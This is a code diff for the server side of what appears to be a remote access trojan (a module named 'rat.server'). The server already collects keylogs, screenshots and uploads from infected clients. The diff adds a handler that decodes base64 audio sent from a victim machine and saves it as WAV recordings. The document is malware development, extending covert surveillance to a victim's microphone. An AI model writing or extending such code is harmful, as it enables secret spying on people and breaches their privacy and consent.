@@ -6,6 +6,7 @@ import ssl
 import json
 import datetime
 import time
+import base64
 from threading import Thread
 from utils.logger import setup_logger
 from rat.server._build_upload_payload import _build_upload_payload
@@ -169,6 +170,8 @@ class SSLServer:
             self._save_keylog(response)
         elif response_type == "SCREENSHOT":
             self._save_screenshot(response)
+        elif response_type == "AUDIO":
+            self._save_audio(response)
         elif response_type == "UPLOAD":
             # Just print the upload status
             print("\n".join(lines))
@@ -336,6 +339,22 @@ class SSLServer:
 
             self._send_to_active_session(command)
             logger.info("Closing client socket")
+
+    def _save_audio(self, response):
+        try:
+            lines = response.split("\n")
+            if lines[1] != "OK":
+                print("Audio capture failed:", lines[2])
+                return
+            encoded = lines[2]
+            data = base64.b64decode(encoded)
+            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"audio_{timestamp}.wav"
+            with open(filename, "wb") as f:
+                f.write(data)
+            print(f"Audio saved: {filename}")
+        except Exception as e:
+            print("Audio save error:", e)
 
 
 class SSLServerThread(Thread):
